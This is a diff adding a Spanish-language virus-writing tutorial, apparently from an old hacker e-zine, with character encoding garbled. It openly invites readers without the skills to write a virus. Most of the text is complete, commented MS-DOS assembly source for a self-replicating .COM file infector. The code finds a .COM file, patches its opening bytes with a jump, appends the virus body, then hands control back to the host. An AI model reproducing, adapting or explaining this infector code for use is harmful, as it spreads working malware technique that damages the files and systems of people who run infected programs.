@@ -1,0 +1,276 @@
+Programaci¢n de virus (b sico) #1...
+-------------------------------------------------------------------------------
+ Esta secci¢n esta dedicada, para aquellos que tienen la intenci¢n, pero NO los
+ conocimientos, como para programar un virus. Ante todo, hacer un virus no es
+ nada del otro mundo. Es un proyecto muy factible, pero eso s¡, es necesario
+ tener conocimientos, por lo menos b sicos, de programaci¢n y muchas ganas!
+ Si algo de esto faltara, programar un virus ser¡a una tarea muy tediosa.
+
+ Bien, si re£nen estos requisitos entonces sigan leyendo este art¡culo...
+
+			JE	READ
+			JNE	FUCK_YOU!
+READ:
+
+ La supervivencia de los virus se basa en la reproducci¢n. Uds. dir n:
+ "Y c¢mo mierda hago para que un programa se reproduzca?", bueno......esto es
+ muy sencillo : Copi ndose a s¡ mismo en otros archivos...
+
+ El funcionamiento l¢gico de un virus es este:
+
+ 1- Busca un file para infectar
+ 2- Lo abre y revisa si esta infectado
+ 3- Si lo esta, busca otro
+ 4- Sino, lo infecta
+ 5- Le devuelve el control al programa anfitri¢n
+
+ Un ejemplo de un virus muy boludo es este..:
+
+;******************************************************************************
+;                         COMIENZO DEL EJEMPLO:
+;******************************************************************************
+
+;Ojo......este ejemplo es una chotada....:
+; - el virus no comprueba infecci¢n.......
+; - busca £nicamente el primer .COM del directorio actual.......
+;
+; Cuidado al ejecutarlo, porque la 1ra vez, se ejecuta, busca el primer file y
+; lo infecta. Si despues corremos ese file reci‚n infectado, se ejecuta el
+; virus desde ah¡. Entonces el virus busca el primer file del direcotorio otra
+; vez y vuleve a infectar el mismo file y as¡ sucesivamente....
+
+;===================================CODIGO=====================================
+;(Aclaraci¢n : las variables de un .COM son relativas al offset 100h)
+
+codigo  segment 'code'
+	org 100h				;Organizo todo el c¢digo a
+						; partir del offset 100h
+	assume cs:codigo,ds:codigo,es:codigo	;Defino el uso de los segmentos
+
+start   proc far				;Comienzo del procedimiento
+COMIENZO:
+	push    cs				;Guardo en la pila a CS
+	push    cs				;Guardo en la pila a CS
+						; otra vez mas.
+	pop     ds				;Saco de la pila a DS
+	pop     es				;Saco de la pila a ES
+
+	call    falso_proc			;Llamo al proc. para que me
+						; quede en la pila la direccion
+						; del proc.
+falso_proc      proc near
+falso_proc      endp
+
+	pop     bp				;BP<== Direccion del proc.
+	sub     bp, 107h			;BP<== BP - Dir. anterior.
+
+
+;Esto lo hago para tomar las variables relativas a BP. Ya que cuando infecto,
+;las variables me quedan desplazadas exactamente la longitud del file. En la
+;primer infecci¢n la posicion de la intrucci¢n SUB BP, 107h es 107h, con lo
+;cual BP me queda en 0, entonces cuando llame a una variable con BP+VARIABLE,
+;el valor de la direcci¢n de la variable no se modifica, y cuando lo cargo de
+;un file infectado de por ejemplo 100h bytes, la instrucci¢n SUB BP,107h me
+;queda en la direcci¢n 207h, quedandome BP=100h, justamente el tama¤o del file
+;original. Entonces si yo hubiera llamado a la variable sin sumarle BP, me hu_
+;biera quedado 100h bytes cortos.
+
+;Buscar el primer .COM del directorio -----------------------------------------
+	mov     ah, 4eh				;Buscar 1er file.
+	lea     dx, bp+file_inf			;DS:DX= offset de FILE_INF
+						;(*.*) para que busque TODOS
+						;los archivos, incluyendo
+						;directorios con extensi¢n.
+	mov     cx, 0000h			;Atributos de la entrada.
+	int     21h
+
+;Esos atributos que menciono en el comentario, son los atributos de la entrada
+;de directorio..Al poner los atributos en 0, le digo al DOS que busque archi_
+;vos normales. Si pongo alguna combinaci¢n de bits que comprenda los atributos
+;de Hidden, System, ¢ Directorio, el DOS busca files con esos atributos, ademas
+;de los normales. Si el rango de busqueda incluye el bit de Volumen, entonces
+;la busqueda se limita a eso.
+;Estos son los bits correspondientes a cada atributo :
+;Bits:	7 6 5 4 3 2 1 0
+;	. . . . . . . 1		Bit 0: Read only
+;	. . . . . . 1 .		Bit 1: Hidden
+;	. . . . . 1 . .		Bit 2: System
+;	. . . . 1 . . .		Bit 3: Volumen
+;	. . . 1 . . . .		Bit 4: Directorio
+;	. . 1 . . . . .		Bit 5: Archivo
+;
+;Los bits 6 y 7 no son usados.. son reservados para 'futuras aplicaciones'
+
+;Abrir file -------------------------------------------------------------------
+	mov     ah, 3dh				;Abro file.
+	mov     al, 00000010b			;Para lectura/escritura.
+	mov     dx, 009eh			;DX<== offset del DTA(Filename)
+	int     21h                             ;El handle viene al AX.
+	push    ax                              ;Lo guardo en la pila.
+
+;Ahora los atributos que estoy seteando en AL, no son los mismos que antes.
+;Estos son atributos de apertura... Lo que nos interesa de esto son £nicamente
+;los primeros 3 bits:
+;
+;Bits:	2 1 0
+;
+;	0 0 0		Modo de Read only
+;	0 0 1		Modo de Write only
+;	0 1 0		Modo de Read/Write
+;
+;Ahora bien, ya en AL tenemos seteados los atributos del file. Lo que necesita_
+;mos ahora es tener en DX, el offset de la variable donde tengo la cadena
+;ASCIIZ con el nombre del file a abrir. En este caso no tenemos una variable
+;NOMBRE_DEL_FILE, sino que el nombre lo tenemos en el DTA (Disk Transfer Area).
+;Digo que lo tenemos en el DTA... por qu‚?? Sencillamente porque el servicio de
+;buscar un file para infectar :) devuelve toda la informaci¢n necesaria en esta
+;zona de memoria.. Este b£ffer, si no fue seteado a otra direcci¢n, se encuen_
+;tra en el PSP. Mas precisamente a partir del offset 80h y tiene un tama¤o de
+;43d bytes.
+;El formato del DTA es el siguiente :
+;
+;Offset		Bytes		Funci¢n
+; 00h		 21d		Usado por el DOS para el servicio 4fh (Buscar
+;				 pr¢ximo file)
+; 15h		 01d		Atributos del file encontrado
+; 16h		 02d		Hora del file
+; 18h		 02d		Fecha del file
+; 1Ah		 04d		Tama¤o del file en bytes
+; 1Eh		 13d		Nombre del file en una cadena ASCIIZ
+;				(FILENAME.EXT),0
+;
+;Bueno, entonces lo £nico que necesito es darle a DX la posici¢n de memoria
+;donde tengo el nombre del file : MOV DX, 1Eh y listo. Pero cuidado, acu‚rdense
+;que el DTA empezaba a partir del offset 80h, osea que a DX le tengo que pasar
+;el valor de : 80h+1Eh = 9Eh. Entonces quedar¡a MOV DX, 9Eh.
+;Ese problema ya est  solucionado. Ahora se preguntar n que es eso del handle..
+;bueno, el handle (tomenlo as¡) es un n£mero con el cu l, el DOS sabe a que ar_
+;chivo nos estamos refiriendo. El DOS nos da un handle por cada archivo que a_
+;brimos, as¡ que hay que tener cuidado, al querer leer o escribir a un file, de
+;tener el handle correspondiente.
+
+;Leo los 3 primeros bytes -----------------------------------------------------
+	pop     bx                              ;Sco handle de la pila hacia BX
+	push    bx				;Y lo vuelvo a guardar.
+	mov     ah, 3fh                         ;Leer file.
+	mov     cx, 0003h			;Leer 3 bytes.
+	lea     dx, bp+buffer                   ;Para guardarlo en el buffer.
+	int     21h
+
+INFECTAR:
+;Mover puntero al principio ---------------------------------------------------
+	mov	ax, 4200h			;Muevo el puntero de escritura
+						; al principio del prog.
+	mov     cx, 0000h
+	mov     dx, 0000h
+	int     21h
+
+;En CX y DX va el desplazamiento del puntero, relativo a la posici¢n del punte_
+;ro (especificado en AL)
+; Modos de desplazamiento del puntero seteados en AL:
+;	AL <== 00	Mover el puntero al principio del file
+;	AL <== 01	Dejar el puntero donde est 
+;	AL <== 02	Mover el puntero al final del file
+
+;Escrivo el primer byte (jmp) -------------------------------------------------
+	mov     ah, 40h				;Escribir el 1er. byte.
+	mov     cx, 1d				;Cantidad=1.
+	lea     dx, bp+jump			;DX<== offset de JUMP
+	int     21h
+
+;(Ac  tambi‚n necesito el handle, pero no lo seteamos otra vez, porque todav¡a
+;el registro donde estaba el handle no se modific¢)...
+;
+;El primer byte que se tiene que escribir es un jump. El s¡mbolo del jump est 
+;mas abajo. Lo que le sigue al jump es la direcci¢n de este salto :
+;Longitud del file + 1 (lo de +1 pruebenlo bien, generalmente trae problemas,
+;si es as¡, entonces multipl¡quenlo por 18 o restenle 23) jejejej.
+;Como todo el c¢digo del virus va a ir copiado al final del file, el salto le
+;da el control al virus en un file infectado.
+
+;Calculo la longitud del file -------------------------------------------------
+	mov     cx, 2				;Copiar 2 bytes.
+	mov     si, 009ah			;SI<== offset del DTA (long.).
+	lea     di, bp+longitud			;DI<== offset de LONGITUD.
+	rep     movsb				;Copia.
+
+;Esta instrucci¢n necesita en DS:SI la direcci¢n del buffer 'SOURCE' y en ES:DI
+;la direcci¢n del buffer donde se va a copiar el string (en este caso copio la
+;longitud del file del DTA a la variable LONGITUD)
+
+	sub	word ptr [bp+longitud], 3	;Resto 3 bytes a [LONGITUD].
+
+;Escrivo longitud o sea, completo el jmp --------------------------------------
+	mov     ah, 40h				;Escribo.
+	mov     cx, 2d                          ;Cantidad de bytes.
+	lea     dx, bp+longitud			;DX<== offset de LONGITUD.
+	int     21h
+
+;Mover puntero al final -------------------------------------------------------
+	mov	ax, 4202h			;Muevo el puntero de escritura
+						; al final del prog.
+	mov     cx, 0000h
+	mov     dx, 0000h
+	int     21h
+	add	word ptr [bp+longitud],3	;Restauro LONGITUD.
+
+;Copio el virus al programa ---------------------------------------------------
+	pop     bx				;Restauro el handle.
+	mov     ah, 40h				;Servicio.
+	mov     cx, 190d			;Cantidad de bytes a copiar.
+	lea 	dx, bp+comienzo			;Copiar desde...
+	int     21h
+
+;Cierro el file luego de haberlo infectado ------------------------------------
+	mov     ah, 3eh				;Cerrar file.
+	int     21h
+
+;Ac  tambi‚n necesito en DS:DX la direcci¢n del buffer con el string contenien_
+;do el nombre del file, pero ya DS y DX me vienen cargados de arriba.
+
+NO_INFECTAR:
+
+;=======================DEVUELVE EL CONTROL AL ANFITRION=======================
+;Copiar el buffer con los 3 primeros byte del file a memoria ------------------
+	mov	cx, 0003h			;Cantidad de bytes (3).
+	mov	di, 0100h			;DI<== offset 100h. Comienzo
+						; del prog. en memoria.
+	lea	si, bp+buffer			;SI<== offset del BUFFER
+	rep	movsb				;Copia.
+
+;Lo que estoy haciendo ac , es recomponer el file, ya que una vez que qued¢
+;infectado, los primeros bytes del programa est n sobreescritos por el virus,
+;por eso hay que volver a poner el file como estaba originalmente (copiando
+;los primeros 3 bytes que hab¡amos guardado anteriormente, a la memoria)
+
+;Saltar al offset 100h --------------------------------------------------------
+
+	mov	ax, 0100h			;Direccion para ejecucion del
+	jmp	ax				; anfitrion.
+
+;En los .com, el c¢digo ejecutable, comienza a partir del offset 100h. 
+;Lo que hay entre el offset 00h y el 100h son datos del programa, como el DTA
+;por ejemplo.
+
+;Antes que nada, la diferencia principal entre un .COM y un .EXE es que un .COM
+;no puede ocupar mas de un segmento de memoria (65535 bytes), mientras que un
+;.EXE puede, ya que el DOS se encarga de "recortarlo" y ponerlo en diferentes
+;segmentos.
+;Los .COM son copias fieles de lo que hay en memoria, a diferencia de los .EXE
+
+;==============================AREA DE DATOS===================================
+
+buffer			db 7d dup(0)
+longitud		db 2 dup(0)
+file_inf		db '*.COM',0
+jump			db 'é',0		;<----ascii del jump
+
+;(El 0 es el caracter de fin de ASCIIZ string)
+
+start	endp					;Fin del procedimiento princip.
+codigo  ends					;Fin del segmento de codigo
+end     comienzo				;Fin. Que empiece en COMIENZO
+
+;******************************************************************************
+;                              FIN DEL EJEMPLO
+;******************************************************************************
